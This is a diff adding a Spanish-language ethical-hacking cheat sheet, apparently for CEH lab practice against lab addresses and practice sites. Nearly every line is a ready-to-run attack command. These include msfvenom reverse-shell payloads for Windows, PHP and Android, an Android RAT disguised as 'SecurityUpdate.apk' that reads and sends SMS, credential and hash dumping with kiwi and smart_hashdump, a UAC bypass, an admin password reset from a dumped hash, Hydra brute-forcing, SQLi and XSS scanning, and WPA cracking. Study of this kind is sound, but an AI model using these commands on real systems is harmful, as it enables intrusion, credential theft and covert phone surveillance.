@@ -149,3 +149,60 @@ grep -B 5 open mysql
 
 Hydra -l james -P given_wordlist ftp://target
 ```
+-----
+Scanning	Detectar Host	sudo nmap -sn -PE IP/MAS	ojo con el sudo	
+SystemHacking	Responder	Responder -I Interface		
+SystemHacking	L0phtCrack	Sacar los  pwd desde windows. Necesitamos credenciales de Admin		
+SystemHacking	msfvenom	msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe > /home/attacker/Desktop/		
+SystemHacking	Identificar PE en Windows	BeRoot.exe y Seatbelt.exe	con meterpreter lo subimos desd Parrot a target con upload	
+ SystemHacking	Meterpreter - PR	"getsystem -t 1, si da error necesitamos escalar, probar con lo de abajo
+use exploit/windows/local/bypassuac_fodhelper -> Escalar Privilegios
+use post/windows/gather/smart_hashdump --> volcar hashes si tenemos permisos"	 use post/windows/manage/sticky_keys	
+ SystemHacking	Meterpreter - PR - kiwi	"load kiwi
+lsa_dump_sam 
+lsa_dump_secrets
+In the console, type password_change -u Admin -n [NTLM hash of Admin acquired in previous step] -P passwordnuevo"		
+ SystemHacking	Steganografia	"OpenStego - Desde Windows
+https://stegonline.georgeom.net/upload  - Online"		
+Web/Dom	Detalle de dominio	python3 ghost_eye.py	Da info de ns1, como dig pero mas completo	
+"[+] 1. EtherApe – Graphical Network Monitor (root)
+[+] 2. DNS Lookup
+[+] 3. Whois Lookup
+[+] 4. Nmap Port Scan
+[+] 5. HTTP Header Grabber
+[+] 6. Clickjacking Test - X-Frame-Options Header
+[+] 7. Robots.txt Scanner
+[+] 8. Cloudflare Cookie scraper
+[+] 9. Link Grabber
+[+] 10. IP Location Finder
+[+] 11. Detecting CMS with Identified Technologies
+[+] 12. Traceroute
+[+] 13. Crawler target url + Robots.txt
+[+] 14. Certificate Transparency log monitor"
+Web	Analiza Web	skipfish -o /home/attacker/test -S /usr/share/skipfish/dictionaries/complete.wl http://[IP Address of Windows Server 2022]:8080		
+Web	Analiza Web	uniscan -u http://10.10.1.22:8080/CEH -qweds		
+Web	Analiza Web	whatweb --log-verbose=MovieScope_Report www.moviescope.com		
+Web	Detectar Balanceador	lbd wweb		
+Web	Vulns Web	Desde Windows Vega.		
+Web	Detectar ClickJack	python3 clickJackPoc.py -f domain.txt		
+Web	Detectar XSS	python3 pwnxss.py -u http://testphp.vulnweb.com		
+Wev	WordPress  - Metasploiy	use auxiliary/scanner/http/wordpress_login_enum		
+web	Meterpreter - Shell PHP	msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP Address of Host Machine] LPORT=4444 -f raw		PAra generar un Shell.PHP que subiremos al target y esperaremos en msf con: use exploit/multi/handler 
+SQLi	Test	python3 dsss.py -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie=LAQUESEA	En consola Developer. Document.cookie para ver la cookie	
+Android	Meterpreter	"msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 R > Desktop/Backdoor.apk 
+cp /root/Desktop/backdoor.apk /var/www/html/share
+python3 -m http.server
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp y poner parametros
+exploit -j -z 
+En Android:
+En el navegador ponemos nuestra ip:8000
+Instalamos y ejecutamos apk"		
+Android	Shell Remoto y demás	phonesploit.py		
+	AndroRat	"cd AndroRAT - Importante que si no no va
+python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk 
+Subimos al Android. Con python3 -m http.server
+En nuestra máquina arrancamos el listener:
+python3 androRAT.py --shell -i 0.0.0.0 -p 4444 --> una vez dentro help para ver todo"		"getSMS inbox 
+getSMS send"
+Wifo	WPA	aircrack-ng -a2 -b [Target BSSID] -w /home/attacker/Desktop/Wordlist/password.txt '/home/attacker/Desktop/Sample Captures/WPA2crack-01.cap' 		
